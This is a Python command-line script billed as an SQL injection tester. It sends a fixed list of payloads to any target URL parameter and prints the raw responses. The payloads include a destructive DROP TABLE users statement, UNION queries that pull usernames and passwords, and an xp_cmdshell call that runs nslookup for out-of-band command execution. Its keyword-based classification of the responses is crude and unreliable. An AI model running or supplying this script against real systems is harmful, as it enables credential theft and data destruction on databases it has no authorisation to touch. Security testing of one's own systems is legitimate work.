import argparse
import requests

def classify_response(response_text):
    if "error" in response_text.lower():
        return "Error-based SQL Injection"
    elif "welcome" in response_text.lower():
        return "Boolean-based SQL Injection"
    elif "wait" in response_text.lower():
        return "Time-based Blind SQL Injection"
    elif "union" in response_text.lower():
        return "Union-based SQL Injection"
    elif "nslookup" in response_text.lower():
        return "Out-of-Band SQL Injection"
    else:
        return "Unknown"

def test_sqli_vulnerability(url, parameter):
    payloads = [
        ("'", "Single Quote Test"),
        ("'; DROP TABLE users; --", "SQL Injection with Malicious Query"),
        ("' OR '1'='1", "Boolean-based SQL Injection Test"),
        ("' OR '1'='2", "Boolean-based SQL Injection Test (False Condition)"),
        ("' OR IF(1=1, SLEEP(5), 0)--", "Time-based Blind SQL Injection Test"),
        ("' OR IF(1=2, SLEEP(5), 0)--", "Time-based Blind SQL Injection Test (False Condition)"),
        ("' OR 1=CONVERT(int, (SELECT @@version))--", "Error-based SQL Injection Test"),
        ("' UNION SELECT null, username, password FROM users--", "Union-based SQL Injection Test"),
        ("' OR 1=1; EXEC xp_cmdshell('nslookup example.com')--", "Out-of-Band SQL Injection Test"),
        ("'; SELECT TOP 1 username FROM users--", "String-based SQL Injection Test"),
        ("1; SELECT username FROM users WHERE '1'='1'--", "Numeric-based SQL Injection Test"),
        ("' OR IF(1=1, WAITFOR DELAY '0:0:5', 0)--", "Boolean-based Time Delay Test"),
        ("' UNION SELECT null, username + ':' + password FROM users--", "Error-based Concatenation Test"),
    ]
    
    for payload, payload_name in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        vulnerability_type = classify_response(response.text)
        
        print(f"Payload: {payload_name}")
        print(f"Vulnerability Type: {vulnerability_type}")
        print(f"Response content: {response.text}")
        print("=" * 50)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameter", required=True, help="Target parameter")

    args = parser.parse_args()
    
    test_sqli_vulnerability(args.url, args.parameter)

if __name__ == "__main__":
    main()
